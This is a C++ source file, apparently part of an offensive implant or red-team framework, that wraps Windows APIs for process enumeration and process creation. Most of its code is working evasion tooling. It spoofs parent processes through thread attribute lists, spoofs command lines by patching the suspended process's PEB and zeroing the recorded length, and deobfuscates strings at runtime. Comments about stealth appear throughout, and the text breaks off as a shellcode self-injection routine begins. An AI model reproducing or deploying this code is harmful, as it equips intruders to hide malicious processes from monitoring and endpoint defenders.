#include <Windows.h>
#include "utils/winapi.h"
#include "utils/random.h"
#include "utils/queue.h"
#include "utils/string_aggregator.h"

/*
Returns all running processes

pProcessInformationSizeWritten: Pointer to variable that receives size (bytes) of data in result buffer (NOT the number of processes)
ppSystemProcessInformation: Double-pointer to resultant SYSTEM_PROCESS_INFORMATION array

ppSystemProcessInformation must be manually freed
*/
void WinApiCustom::GetProcessAll(OUT ULONG *pProcessInformationSizeWritten, OUT SYSTEM_PROCESS_INFORMATION **ppSystemProcessInformation)
{
    // Initialise variables
    ULONG processInformationSizeReqd = 0;
    *pProcessInformationSizeWritten = 0;
    *ppSystemProcessInformation = NULL;

    // Get buffer size required
    NTSTATUS stats = this->loadedFunctions.NtQuerySystemInformation(
        SystemProcessInformation,
        NULL,
        0,
        &processInformationSizeReqd);
    if (processInformationSizeReqd == 0)
        return;

    // Allocate buffer
    *ppSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)this->HeapAllocCustom(processInformationSizeReqd);
    if (*ppSystemProcessInformation == NULL)
        return;

    // Get processes
    stats = this->loadedFunctions.NtQuerySystemInformation(
        SystemProcessInformation,
        *ppSystemProcessInformation,
        processInformationSizeReqd,
        pProcessInformationSizeWritten);
    if (stats != 0 || processInformationSizeReqd != *pProcessInformationSizeWritten)
    {
        if (*ppSystemProcessInformation != NULL)
        {
            this->HeapFreeCustom(*ppSystemProcessInformation);
            *pProcessInformationSizeWritten = 0;
        }
    }
}

/*
Provides more detailed information about processes. Requires output of GetProcessAll() as input.

Returned result is a Queue of SYSTEM_PROCESS_INFORMATION_DETAILED structs, in which ImageName, CommandLine must be manually freed.

Note: This attempts opening query handles to all processes, and might not be stealthy
*/
void WinApiCustom::GetProcessAllDetailed(IN PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, IN Queue *pProcessesDetailedQueue)
{
    if (pSystemProcessInformation == NULL)
        return;

    // Initialise variables
    PSYSTEM_PROCESS_INFORMATION pSystemProcessInformationCurr = pSystemProcessInformation;
    HANDLE hProcessCurrent = FALSE;
    PPEB_DETAILED pPebProcessCurrent = NULL;
    SECURITY_INFO_CUSTOM securityInfoProcessCurrent;
    SYSTEM_PROCESS_INFORMATION_DETAILED processDetail;

    RtlZeroMemoryCustom((PBYTE)&securityInfoProcessCurrent, sizeof(SECURITY_INFO_CUSTOM));

    // Iterate through all processes
    while (TRUE)
    {
        // Reset process detail
        RtlZeroMemoryCustom((PBYTE)&processDetail, sizeof(SYSTEM_PROCESS_INFORMATION_DETAILED));

        // For current process, copy the information already available at hand
        processDetail.ImageName = (PCHAR)this->HeapAllocCustom(pSystemProcessInformationCurr->ImageName.Length + 1);
        if (processDetail.ImageName != NULL)
            WideStringToUtf8(pSystemProcessInformationCurr->ImageName.Buffer, processDetail.ImageName);

        processDetail.SessionId = pSystemProcessInformationCurr->SessionId;

        processDetail.ProcessId = (DWORD)(pSystemProcessInformationCurr->UniqueProcessId);

        processDetail.VirtualSize = pSystemProcessInformationCurr->VirtualSize;

        // For current process, attempt to get more information
        hProcessCurrent = this->loadedFunctions.OpenProcess(
            PROCESS_QUERY_INFORMATION,
            FALSE,
            (DWORD)(pSystemProcessInformationCurr->UniqueProcessId));
        if (hProcessCurrent != NULL)
        {
            // Get necessary info from PEB
            pPebProcessCurrent = (PPEB_DETAILED)(this->GetPebOfProcess(hProcessCurrent));
            if (pPebProcessCurrent != NULL)
            {
                processDetail.IsProtectedProcess = pPebProcessCurrent->IsProtectedProcess;

                processDetail.CommandLine = (PCHAR)this->HeapAllocCustom(pPebProcessCurrent->ProcessParameters->CommandLine.Length + 1);
                if (processDetail.CommandLine != NULL)
                    WideStringToUtf8(pPebProcessCurrent->ProcessParameters->CommandLine.Buffer, processDetail.CommandLine);

                // Cleanup
                this->HeapFreeCustom(pPebProcessCurrent);
                pPebProcessCurrent = NULL;
            }

            // Get necessary info from security info
            this->GetObjectSecurityInfoCustom(hProcessCurrent, SECURABLE_OBJECT_TYPE_CUSTOM::PROCESS, &securityInfoProcessCurrent);
            processDetail.sidOwner = securityInfoProcessCurrent.sidOwner;
            processDetail.sidGroup = securityInfoProcessCurrent.sidGroup;

            if (securityInfoProcessCurrent.pAcesCustom != NULL)
                this->HeapFreeCustom(securityInfoProcessCurrent.pAcesCustom);
            RtlZeroMemoryCustom((PBYTE)&securityInfoProcessCurrent, sizeof(SECURITY_INFO_CUSTOM));

            // Close handle to process
            this->loadedFunctions.CloseHandle(hProcessCurrent);
            hProcessCurrent = NULL;
        }

        // Store process details
        pProcessesDetailedQueue->Enqueue(&processDetail, sizeof(SYSTEM_PROCESS_INFORMATION_DETAILED));

        // No more processes exist
        if (pSystemProcessInformationCurr->NextEntryOffset == 0)
            break;

        // Prepare to go to next process
        else
            pSystemProcessInformationCurr = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pSystemProcessInformationCurr + pSystemProcessInformation->NextEntryOffset);
    }
}

/*
Searches for a particular Process with name

pSystemProcessInformation: Pointer to a SYSTEM_PROCESS_INFORMATION array
targetProcessName: Target process name
*/
PSYSTEM_PROCESS_INFORMATION WinApiCustom::ProcessSearchWithName(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PWCHAR targetProcessName)
{
    DWORD targetProcessNameLen = StrLenW(targetProcessName);
    if (pSystemProcessInformation == NULL || targetProcessName == NULL || targetProcessNameLen == 0)
        return NULL;

    // Initialise variables
    WCHAR targetProcessNameLower[MAX_PATH + 1] = L"";
    WCHAR processNameLower[MAX_PATH + 1] = L"";

    RtlZeroMemoryCustom((PBYTE)targetProcessNameLower, MAX_PATH + 1);
    WideStringToLower(targetProcessName, targetProcessNameLower);

    // In a loop, iterate through all processes, and check if it's target
    while (TRUE)
    {
        // If process name matches, return process id
        if (pSystemProcessInformation->ImageName.Buffer != NULL)
        {
            RtlZeroMemoryCustom((PBYTE)processNameLower, MAX_PATH + 1);
            WideStringToLower(pSystemProcessInformation->ImageName.Buffer, processNameLower);

            if (CompareBuffer(targetProcessNameLower, processNameLower, targetProcessNameLen))
                return pSystemProcessInformation;
        }

        // Else, advance to next process
        else if (pSystemProcessInformation->NextEntryOffset != 0)
            pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);

        // No more processes
        else
            break;
    }

    // If execution reaches here, it means search did not find target
    return NULL;
}

/*
Searches for a particular Process with ID

pSystemProcessInformation: Pointer to a SYSTEM_PROCESS_INFORMATION array
targetProcessId: Target process ID
*/
PSYSTEM_PROCESS_INFORMATION WinApiCustom::ProcessSearchWithId(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, DWORD targetProcessId)
{
    if (pSystemProcessInformation == NULL)
        return NULL;

    // In a loop, iterate through all processes, and check if it's target
    while (TRUE)
    {
        // If process ID matches, return process
        if ((DWORD)pSystemProcessInformation->UniqueProcessId == targetProcessId)
            return pSystemProcessInformation;
        else if (pSystemProcessInformation->NextEntryOffset != 0)
            pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);
        else
            break;
    }

    // If execution reaches here, it means search did not find target
    return NULL;
}

/*
Get PEB of a specified process

Returned pointer to PEB must be manually freed
*/
PPEB WinApiCustom::GetPebOfProcess(IN HANDLE hTargetProcess)
{
    const SIZE_T processBasicInformationSize = sizeof(PROCESS_BASIC_INFORMATION);
    PROCESS_BASIC_INFORMATION processBasicInformation;
    RtlZeroMemoryCustom(((PBYTE)&processBasicInformation), sizeof(PROCESS_BASIC_INFORMATION));
    ULONG processBasicInformationSizeWritten = 0;

    // Get PEB address in target process
    this->loadedFunctions.NtQueryInformationProcess(hTargetProcess, ProcessBasicInformation, &processBasicInformation, processBasicInformationSize, &processBasicInformationSizeWritten);
    if (processBasicInformationSizeWritten == 0)
        return NULL;

    // Read PEB from target process
    SIZE_T pebSizeRead = 0;
    PPEB pPeb = (PPEB)(this->HeapAllocCustom(sizeof(PEB)));
    if (pPeb == NULL)
        return NULL;
    this->loadedFunctions.ReadProcessMemory(hTargetProcess, processBasicInformation.PebBaseAddress, pPeb, sizeof(PEB), &pebSizeRead);
    if (pebSizeRead == 0)
    {
        if (pPeb != NULL)
            this->HeapFreeCustom(pPeb);
        return NULL;
    }

    return pPeb;
}

/*
Get process parameters from PEB of a process

Returned pointer must be manually freed
*/
PRTL_USER_PROCESS_PARAMETERS WinApiCustom::GetProcessParameters(IN HANDLE hProcess, OUT RTL_USER_PROCESS_PARAMETERS **ppProcessParametersInTargetProcess)
{
    // Initialise variables
    PPEB pPeb = NULL;
    PRTL_USER_PROCESS_PARAMETERS pProcessParameters = NULL;
    *ppProcessParametersInTargetProcess = NULL;

    // Get PEB of process
    pPeb = this->GetPebOfProcess(hProcess);
    if (pPeb == NULL)
        goto CLEANUP;

    // Read process parameters
    pProcessParameters = (PRTL_USER_PROCESS_PARAMETERS)(this->HeapAllocCustom(sizeof(RTL_USER_PROCESS_PARAMETERS)));
    if (pProcessParameters == NULL)
        goto CLEANUP;
    SIZE_T userProcessParametersSizeRead = 0;
    *ppProcessParametersInTargetProcess = pPeb->ProcessParameters;
    this->loadedFunctions.ReadProcessMemory(
        hProcess,
        *ppProcessParametersInTargetProcess,
        pProcessParameters,
        sizeof(RTL_USER_PROCESS_PARAMETERS),
        &userProcessParametersSizeRead);
    if (userProcessParametersSizeRead == 0)
    {
        this->HeapFreeCustom(pProcessParameters);
        pProcessParameters = NULL;
        goto CLEANUP;
    }

CLEANUP:
    if (pPeb != NULL)
        this->HeapFreeCustom(pPeb);

    return pProcessParameters;
}

#define PROCESS_OUTPUT_BUFFER_SIZE 1024
/*
Reads total output from a Process's STDOUT read handle

Returned double-pointer must be manually freed
*/
void WinApiCustom::ReadOutputFromProcess(IN PHANDLE phStdoutRead, OUT VOID **ppProcessOutput, OUT PDWORD pProcessOutputSize)
{
    DWORD readSize = 0;
    DWORD readTotalSize = 0;
    BOOL isSuccess = FALSE;
    *ppProcessOutput = NULL; // For consolidated output
    LPVOID newBufferAddr = NULL;
    BYTE processOutputBuffer[PROCESS_OUTPUT_BUFFER_SIZE] = ""; // For buffer output

    // Start reading from process in indefinite loop
    while (TRUE)
    {
        // Capture child's STDOUT and store in buffer output
        isSuccess = this->loadedFunctions.ReadFile(*phStdoutRead, processOutputBuffer, PROCESS_OUTPUT_BUFFER_SIZE, &readSize, NULL);
        if (!isSuccess || readSize == 0)
            break;

        // Allocate/Re-allocate memory for buffer
        if (*ppProcessOutput == NULL)
            newBufferAddr = this->HeapAllocCustom(readSize);
        else
            newBufferAddr = this->HeapReAllocCustom(*ppProcessOutput, readTotalSize + readSize);
        if (newBufferAddr == NULL)
            break;
        *ppProcessOutput = newBufferAddr;

        // Copy from buffer to consolidated output
        CopyBuffer(((PBYTE)*ppProcessOutput + readTotalSize), processOutputBuffer, readSize);

        // Keep track of total data read
        readTotalSize += readSize;
    }

    *pProcessOutputSize = readTotalSize;
}

/*
Creates a new process with all specified parameters

pImagePath: Pointer to executable image path for new process
pCommandLineArgs: Pointer to command line arguments for new process
parentProcessId: ID of process to spoof as parent process; -1 to spawn from self
pCurrentDirectory: Current directory of the new process
createSuspended: TRUE if the process is to be created in suspended mode
createHidden: TRUE if process should be visually hidden, i.e, no window
pProcessInformation: Pointer to PROCESS_INFORMATION that receives process information
phStdoutRead: Pointer to STDOUT read handle from which process output can be read; must be closed after used

Returned PPROCESS_INFORMATION contains handles that must be closed after use
*/
BOOL WinApiCustom::CreateNewProcessCustom(IN PCHAR pImagePath, IN PCHAR pCommandLineArgs, IN DWORD parentProcessId, IN PCHAR pCurrentDirectory, IN BOOL createSuspended, IN BOOL createHidden, OUT PPROCESS_INFORMATION pProcessInformation, OUT PHANDLE phStdoutRead)
{
    // Validation
    if (pImagePath == NULL)
        return FALSE;

    // Initialise variables
    PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation = NULL;
    HANDLE hParentProcessSpoof = NULL;
    LPPROC_THREAD_ATTRIBUTE_LIST pThreadAttributeList = NULL;
    PCHAR commandLineSpoofed = NULL;
    PCHAR commandLineReal = NULL;
    PRTL_USER_PROCESS_PARAMETERS pProcessParameters = NULL;
    PWCHAR pCommandLineW = NULL;
    BOOL isSuccess = FALSE;
    DWORD imagePathLen = StrLen(pImagePath);
    DWORD commandLineArgsLen = 0;
    DWORD commandLineLen = 0;

    // Get list of all running processes
    ULONG systemProcessInformationSize = 0;
    this->GetProcessAll(&systemProcessInformationSize, &pSystemProcessInformation);
    if (systemProcessInformationSize == 0 || pSystemProcessInformation == NULL)
        goto CLEANUP;

    // Get required parent process HANDLE if needed
    if (parentProcessId != -1)
    {
        hParentProcessSpoof = this->loadedFunctions.OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentProcessId);
        if (hParentProcessSpoof == NULL)
            goto CLEANUP;
    }

    // Prepare thread attribute list if needed
    DWORD64 threadAttributeListSize = 0;
    DWORD threadAttributesNum = (parentProcessId != -1 ? 1 : 0);
    if (threadAttributesNum != 0)
    {
        this->loadedFunctions.InitializeProcThreadAttributeList(NULL, threadAttributesNum, 0, &threadAttributeListSize);
        if (threadAttributeListSize == 0)
            goto CLEANUP;
        pThreadAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)(this->HeapAllocCustom(threadAttributeListSize));
        if (pThreadAttributeList == NULL)
            goto CLEANUP;
        if (!this->loadedFunctions.InitializeProcThreadAttributeList(pThreadAttributeList, threadAttributesNum, 0, &threadAttributeListSize))
            goto CLEANUP;
    }

    //// Set parent process if needed
    if (parentProcessId != -1)
    {
        if (!this->loadedFunctions.UpdateProcThreadAttribute(pThreadAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, hParentProcessSpoof, sizeof(hParentProcessSpoof), NULL, NULL))
            goto CLEANUP;
    }

    // Create startup info
    STARTUPINFOA startupInfo;
    RtlZeroMemoryCustom((PBYTE)(&startupInfo), sizeof(startupInfo));
    startupInfo.cb = threadAttributeListSize == 0 ? sizeof(STARTUPINFOA) : sizeof(STARTUPINFOEXA);

    //// For hidden window; (this may not work if Window specifies anything other than default dimensions)
    if (createHidden)
    {
        startupInfo.dwFlags |= (STARTF_USESIZE | STARTF_USESHOWWINDOW);
        startupInfo.dwXSize = 0;
        startupInfo.dwYSize = 0;
        startupInfo.wShowWindow = SW_HIDE;
    }

    //// Create anonymous pipe to capture STDOUT and STDERR from process
    SECURITY_ATTRIBUTES secAttr;
    RtlZeroMemoryCustom((PBYTE)(&secAttr), sizeof(SECURITY_ATTRIBUTES));
    secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    secAttr.bInheritHandle = TRUE;
    secAttr.lpSecurityDescriptor = NULL;

    HANDLE hStdoutWrite = NULL;
    if (!this->loadedFunctions.CreatePipe(phStdoutRead, &hStdoutWrite, &secAttr, 0))
        goto CLEANUP;
    if (*phStdoutRead == NULL || hStdoutWrite == NULL)
        goto CLEANUP;

    startupInfo.dwFlags |= STARTF_USESTDHANDLES;
    startupInfo.hStdOutput = hStdoutWrite;
    startupInfo.hStdError = hStdoutWrite;

    STARTUPINFOEXA startupInfoEx;
    RtlZeroMemoryCustom((PBYTE)(&startupInfoEx), sizeof(startupInfoEx));
    startupInfoEx.StartupInfo = startupInfo;
    startupInfoEx.lpAttributeList = pThreadAttributeList;

    // Create spoofed commandline
    if (pCommandLineArgs != NULL)
        commandLineArgsLen = StrLen(pCommandLineArgs);

    //// Create buffer
    commandLineLen = 1 + imagePathLen + 1 + (pCommandLineArgs == NULL ? 0 : (1 + commandLineArgsLen)); // "imagePath" arg1
    commandLineSpoofed = (PCHAR)(this->HeapAllocCustom(commandLineLen + 1));
    if (commandLineSpoofed == NULL)
        goto CLEANUP;

    //// Copy image path into command line
    ConcatString(commandLineSpoofed, "\"");
    ConcatString(commandLineSpoofed, pImagePath);
    ConcatString(commandLineSpoofed, "\"");

    //// Add spoofed params into command line
    if (pCommandLineArgs != NULL)
    {
        ConcatString(commandLineSpoofed, " ");

        RandomGenerator randomGenerator = RandomGenerator(this);
        randomGenerator.GenerateRandomStr(commandLineArgsLen, commandLineSpoofed);
    }

    // Create process
    RtlZeroMemoryCustom((PBYTE)pProcessInformation, sizeof(PROCESS_INFORMATION));
    if (!this->loadedFunctions.CreateProcessA(
            pImagePath,
            (commandLineArgsLen == 0 ? NULL : commandLineSpoofed),
            NULL,
            NULL,
            TRUE,
            (threadAttributeListSize == 0 ? 0 : EXTENDED_STARTUPINFO_PRESENT) | (createHidden ? CREATE_NO_WINDOW : 0) | CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            NULL,
            pCurrentDirectory,
            (LPSTARTUPINFOA)(&startupInfoEx),
            pProcessInformation))
        goto CLEANUP;

    // Fix commandline of new process
    if (pCommandLineArgs != NULL && commandLineArgsLen != 0)
    {
        //// Prepare real commandline
        commandLineReal = (PCHAR)(this->HeapAllocCustom(commandLineLen + 1));
        if (commandLineReal == NULL)
            goto CLEANUP;

        ConcatString(commandLineReal, "\"");
        ConcatString(commandLineReal, pImagePath);
        ConcatString(commandLineReal, "\" ");
        ConcatString(commandLineReal, pCommandLineArgs);

        //// Get new process's commandline
        PRTL_USER_PROCESS_PARAMETERS pProcessParametersInTargetProcess = NULL;
        pProcessParameters = this->GetProcessParameters(pProcessInformation->hProcess, &pProcessParametersInTargetProcess);
        if (pProcessParameters == NULL)
            goto CLEANUP;

        //// Patch commandline
        DWORD commandLineWSize = (commandLineLen + 1) * sizeof(WCHAR);
        pCommandLineW = (PWCHAR)(this->HeapAllocCustom(commandLineWSize));
        if (pCommandLineW == NULL)
            goto CLEANUP;

        Utf8ToWideString(commandLineReal, pCommandLineW);

        SIZE_T patchSize = 0;
        this->loadedFunctions.WriteProcessMemory(
            pProcessInformation->hProcess,
            pProcessParameters->CommandLine.Buffer,
            pCommandLineW,
            commandLineWSize,
            &patchSize);
        if (patchSize != commandLineWSize)
            goto CLEANUP;

        //// Patch commandline length to Zero
        DWORD commandLineSizeToWrite = 0;
        patchSize = 0;

        this->loadedFunctions.WriteProcessMemory(
            pProcessInformation->hProcess,
            &(pProcessParametersInTargetProcess->CommandLine.Length),
            &commandLineSizeToWrite,
            sizeof(commandLineSizeToWrite),
            &patchSize);
        if (patchSize != sizeof(commandLineSizeToWrite))
            goto CLEANUP;
    }

    // Resume process
    if (!createSuspended)
        this->loadedFunctions.ResumeThread(pProcessInformation->hThread);

    // If execution reaches here, all went well
    isSuccess = TRUE;

CLEANUP:
    if (hStdoutWrite != NULL)
        this->loadedFunctions.CloseHandle(hStdoutWrite);

    if (pSystemProcessInformation != NULL)
        this->HeapFreeCustom(pSystemProcessInformation);

    if (hParentProcessSpoof != NULL)
        this->loadedFunctions.CloseHandle(hParentProcessSpoof);

    if (pThreadAttributeList == NULL)
    {
        this->loadedFunctions.DeleteProcThreadAttributeList(pThreadAttributeList);
        this->HeapFreeCustom(pThreadAttributeList);
    }

    if (commandLineSpoofed != NULL)
        this->HeapFreeCustom(commandLineSpoofed);

    if (commandLineReal != NULL)
        this->HeapFreeCustom(commandLineReal);

    if (pProcessParameters != NULL)
        this->HeapFreeCustom(pProcessParameters);

    if (pCommandLineW != NULL)
        this->HeapFreeCustom(pCommandLineW);

    if (!isSuccess)
    {
        this->loadedFunctions.CloseHandle(pProcessInformation->hThread);
        this->loadedFunctions.CloseHandle(pProcessInformation->hProcess);
        RtlZeroMemoryCustom((PBYTE)pProcessInformation, sizeof(PROCESS_INFORMATION));
    }

    return isSuccess;
}

/*
Suspends/Resumes a process (its threads)

targetProcessId: PID of target process
toResume: TRUE if process are to be resumed, else they are suspended
*/
BOOL WinApiCustom::ProcessSuspendResume(DWORD targetProcessId, BOOL toResume)
{
    BOOL isSuccess = FALSE;

    // Get all processes, and filter for target process
    ULONG processInformationSizeWritten = 0;
    PSYSTEM_PROCESS_INFORMATION pAllProcesses = NULL;
    this->GetProcessAll(
        &processInformationSizeWritten,
        &pAllProcesses);
    if (pAllProcesses == NULL || processInformationSizeWritten == 0)
        goto CLEANUP;

    PSYSTEM_PROCESS_INFORMATION pTargetProcess = this->ProcessSearchWithId(pAllProcesses, targetProcessId);
    if (pTargetProcess == NULL)
        goto CLEANUP;

    // If execution reaches here, all good till now
    isSuccess = TRUE;

    // Get all threads of target process
    ULONG threadsNum = pTargetProcess->NumberOfThreads;
    PSYSTEM_THREAD_INFORMATION pThread = (PSYSTEM_THREAD_INFORMATION)((PBYTE)pTargetProcess + sizeof(SYSTEM_PROCESS_INFORMATION));

    // Iterate through all threads, resume those that are suspended
    HANDLE hThread = NULL;
    for (DWORD i = 0; i < threadsNum; i++)
    {
        // Open handle to thread
        hThread = this->loadedFunctions.OpenThread(
            THREAD_SUSPEND_RESUME,
            NULL,
            (DWORD)(pThread->ClientId.UniqueThread));
        if (hThread != NULL)
        {
            // Suspend/Resume
            if (toResume)
                isSuccess = isSuccess && (this->loadedFunctions.ResumeThread(hThread) != (DWORD)-1);
            else
                isSuccess = isSuccess && (this->loadedFunctions.SuspendThread(hThread) != (DWORD)-1);
        }

        // Move to next thread
        ++pThread;
    }

CLEANUP:
    if (pAllProcesses != NULL)
        this->HeapFreeCustom(pAllProcesses);

    return isSuccess;
}

/*
Terminates a process
*/
BOOL WinApiCustom::ProcessTerminate(DWORD processId)
{
    // Open process handle
    HANDLE hProcess = this->loadedFunctions.OpenProcess(
        PROCESS_TERMINATE,
        FALSE,
        processId);
    if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
    {
        // Terminate process
        BOOL isSuccess = this->loadedFunctions.TerminateProcess(hProcess, 0);

        // Close handle
        this->loadedFunctions.CloseHandle(hProcess);

        return isSuccess;
    }
    else
        return FALSE;
}

/*
Describes a process listing. This requires output of GetProcessAll().

This tries opening query handles to all processes, and might not be stealthy.

Returned double-pointer must be manually freed
*/
void WinApiCustom::DescribeProcessListing(IN PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, OUT CHAR **ppOutput, OUT PDWORD pOutputSize)
{
    if (pSystemProcessInformation == NULL)
        return;

    // Initialise
    ULONG processInformationSizeWritten = 0;
    PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation = NULL;
    Queue processDetailedQueue = Queue(this, FALSE);
    PSYSTEM_PROCESS_INFORMATION_DETAILED pProcessDetail;
    StringAggregator stringAggregator = StringAggregator(this, FALSE);
    CHAR strProcessDetail[23] = "";
    PCHAR pUsername = NULL, pDomain = NULL, pSid = NULL;

    static CHAR strOWNER[STRING_OWNER_LEN + 1] = ""; // "OWNER"
    DeobfuscateUtf8String(
        (PCHAR)STRING_OWNER,
        STRING_OWNER_LEN,
        strOWNER);
    static CHAR strGROUP[STRING_GROUP_LEN + 1] = ""; // "GROUP"
    DeobfuscateUtf8String(
        (PCHAR)STRING_GROUP,
        STRING_GROUP_LEN,
        strGROUP);
    static CHAR strPID[STRING_PID_LEN + 1] = ""; // "PID"
    DeobfuscateUtf8String(
        (PCHAR)STRING_PID,
        STRING_PID_LEN,
        strPID);
    static CHAR strIMAGE[STRING_IMAGE_LEN + 1] = ""; // "IMAGE"
    DeobfuscateUtf8String(
        (PCHAR)STRING_IMAGE,
        STRING_IMAGE_LEN,
        strIMAGE);
    static CHAR strCOMMANDLINE[STRING_COMMANDLINE_LEN + 1] = ""; // "COMMANDLINE"
    DeobfuscateUtf8String(
        (PCHAR)STRING_COMMANDLINE,
        STRING_COMMANDLINE_LEN,
        strCOMMANDLINE);
    static CHAR strSESSION_ID[STRING_SESSION_ID_LEN + 1] = ""; // "SESSION_ID"
    DeobfuscateUtf8String(
        (PCHAR)STRING_SESSION_ID,
        STRING_SESSION_ID_LEN,
        strSESSION_ID);
    static CHAR strVIRTUAL_SIZE[STRING_VIRTUAL_SIZE_LEN + 1] = ""; // "VIRTUAL_SIZE"
    DeobfuscateUtf8String(
        (PCHAR)STRING_VIRTUAL_SIZE,
        STRING_VIRTUAL_SIZE_LEN,
        strVIRTUAL_SIZE);
    static CHAR strPROTECTED[STRING_PROTECTED_LEN + 1] = ""; // "PROTECTED"
    DeobfuscateUtf8String(
        (PCHAR)STRING_PROTECTED,
        STRING_PROTECTED_LEN,
        strPROTECTED);
    static CHAR strYES[STRING_YES_LEN + 1] = ""; // "YES"
    DeobfuscateUtf8String(
        (PCHAR)STRING_YES,
        STRING_YES_LEN,
        strYES);
    static CHAR strNO[STRING_NO_LEN + 1] = ""; // "NO"
    DeobfuscateUtf8String(
        (PCHAR)STRING_NO,
        STRING_NO_LEN,
        strNO);

    // Get all processes
    this->GetProcessAll(&processInformationSizeWritten, &pSystemProcessInformation);
    if (pSystemProcessInformation == NULL)
        goto CLEANUP;
    this->GetProcessAllDetailed(pSystemProcessInformation, &processDetailedQueue);

    // Iterate through all processes
    while (processDetailedQueue.GetSize() != 0)
    {
        pProcessDetail = (PSYSTEM_PROCESS_INFORMATION_DETAILED)(processDetailedQueue.Dequeue());

        /*
        Parse process detail and add to string aggregator

        PID: ProcessId
        Image: ImageName
        Commandline: CommandLine
        SessionId: SessionId
        Owner: Owner
        Owner: Group
        VirtualSize: VirtualSize
        IsProtected: IsProtected
        */

        //// ProcessID
        stringAggregator.AddString(strPID);
        stringAggregator.AddString(": ");
        Integer32ToString(pProcessDetail->ProcessId, strProcessDetail);
        stringAggregator.AddString(strProcessDetail);
        stringAggregator.AddString("\n");

        //// Image name
        stringAggregator.AddString(strIMAGE);
        stringAggregator.AddString(": ");
        stringAggregator.AddString(pProcessDetail->ImageName);
        stringAggregator.AddString("\n");

        //// Commandline
        stringAggregator.AddString(strCOMMANDLINE);
        stringAggregator.AddString(": ");
        stringAggregator.AddString(pProcessDetail->CommandLine);
        stringAggregator.AddString("\n");

        //// Session ID
        stringAggregator.AddString(strSESSION_ID);
        stringAggregator.AddString(": ");
        Integer64ToString(pProcessDetail->SessionId, strProcessDetail);
        stringAggregator.AddString(strProcessDetail);
        stringAggregator.AddString("\n");

        //// Owner
        this->DescribeSid(&(pProcessDetail->sidOwner), &pSid, &pUsername, &pDomain);

        stringAggregator.AddString(strOWNER);
        stringAggregator.AddString(": ");
        stringAggregator.AddString(pDomain == NULL ? "??" : pDomain);
        stringAggregator.AddString(pDomain == NULL ? "" : "/");
        stringAggregator.AddString(pUsername == NULL ? "??" : pUsername);
        stringAggregator.AddString(" {");
        stringAggregator.AddString(pSid == NULL ? "S-??" : pSid);
        stringAggregator.AddString("}\n");

        if (pDomain != NULL)
        {
            this->HeapFreeCustom(pDomain);
            pDomain = NULL;
        };
        if (pUsername != NULL)
        {
            this->HeapFreeCustom(pUsername);
            pUsername = NULL;
        };
        if (pSid != NULL)
        {
            this->HeapFreeCustom(pSid);
            pSid = NULL;
        };

        //// Group
        this->DescribeSid(&(pProcessDetail->sidGroup), &pSid, &pUsername, &pDomain);

        stringAggregator.AddString(strGROUP);
        stringAggregator.AddString(": ");
        stringAggregator.AddString(pDomain == NULL ? "??" : pDomain);
        stringAggregator.AddString(pDomain == NULL ? "" : "/");
        stringAggregator.AddString(pUsername == NULL ? "??" : pUsername);
        stringAggregator.AddString(" {");
        stringAggregator.AddString(pSid == NULL ? "S-??" : pSid);
        stringAggregator.AddString("}\n");

        if (pDomain != NULL)
        {
            this->HeapFreeCustom(pDomain);
            pDomain = NULL;
        };
        if (pUsername != NULL)
        {
            this->HeapFreeCustom(pUsername);
            pUsername = NULL;
        };
        if (pSid != NULL)
        {
            this->HeapFreeCustom(pSid);
            pSid = NULL;
        };

        //// VirtualSize
        stringAggregator.AddString(strVIRTUAL_SIZE);
        stringAggregator.AddString(": ");
        Integer64ToString(pProcessDetail->VirtualSize, strProcessDetail);
        stringAggregator.AddString(strProcessDetail);
        stringAggregator.AddString("\n");

        //// IsProtected
        stringAggregator.AddString(strPROTECTED);
        stringAggregator.AddString(": ");
        stringAggregator.AddString(pProcessDetail->IsProtectedProcess ? strYES : strNO);

        //// Newline
        stringAggregator.AddString("\n----------------------\n");

        // CLEANUP
        if (pProcessDetail->ImageName != NULL)
            this->HeapFreeCustom(pProcessDetail->ImageName);
        if (pProcessDetail->CommandLine != NULL)
            this->HeapFreeCustom(pProcessDetail->CommandLine);
    }

    // Combine all strings
    *pOutputSize = stringAggregator.GetTotalLengthOfAllStrings() + 1;
    if (*pOutputSize != 0)
    {
        *ppOutput = (PCHAR)(this->HeapAllocCustom(*pOutputSize));
        if (*ppOutput == NULL)
            *pOutputSize = 0;
        else
            stringAggregator.CombineAllStrings(*ppOutput);
    }

    // CLEANUP
CLEANUP:
    if (pSystemProcessInformation != NULL)
        this->HeapFreeCustom(pSystemProcessInformation);
}

/*
Gets actual current thread handle

Returned handle must be closed manually
*/
void WinApiCustom::GetCurrentThreadHandleActual(OUT PHANDLE phThread)
{
    *phThread = NULL;
    this->loadedFunctions.DuplicateHandle(
        this->GetCurrentProcessHandlePseudo(),
        this->GetCurrentThreadHandlePseudo(),
        this->GetCurrentProcessHandlePseudo(),
        phThread,
        0,
        FALSE,
        DUPLICATE_SAME_ACCESS);
}

// This functions causes calling thread to go into Alertable state indefinitely
struct __ALERTABLE_THREAD_FUNCTION_PARAMS
{
    WinApiCustom *pWinApiCustom;
};
void __AlertableThreadFunction(__ALERTABLE_THREAD_FUNCTION_PARAMS params)
{
    HANDLE hMutex = params.pWinApiCustom->CreateMutexCustom();
    if (hMutex != NULL)
        params.pWinApiCustom->loadedFunctions.WaitForSingleObject(
            hMutex,
            INFINITE);
}

/*
Inject shellcode into current process

Copies input shellcode into a new executable memory
*/
BOOL WinApiCustom::ProcessInjectShellcodeSelf(BOOL createNewThread, LPVOID pShellcode, DWORD shellcodeSize)
{
    if (pShellcode != NULL && shellcodeSize != 0)
    {
        // Initialise variables
